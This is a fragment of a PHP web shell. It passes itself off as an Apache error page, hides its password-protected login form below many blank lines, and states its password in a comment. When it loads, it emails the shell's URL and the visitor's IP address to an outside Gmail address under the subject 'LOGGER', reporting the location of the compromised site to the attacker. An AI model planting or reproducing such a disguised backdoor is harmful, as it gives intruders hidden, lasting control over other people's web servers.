...
error was encountered while trying to use an ErrorDocument to handle the request.</p>
	<style>
		...
		</style><center><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
		<form method="post">
			<center>
...
if (!isset($_SESSION['authenticated'])) { //password : dewata
    $stored_hashed_password = '$2a$12$hmaV5QMdN9fFQNgk93TE9OQLJMn5TKmTZ0IekdGbmpDWQEwBPi4Xq'; // Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://bcrypt-generator.com/ untuk menghasilkan kata sandi Anda
...
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'markernewbie@gmail.com, markernewbie@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
# function WAF
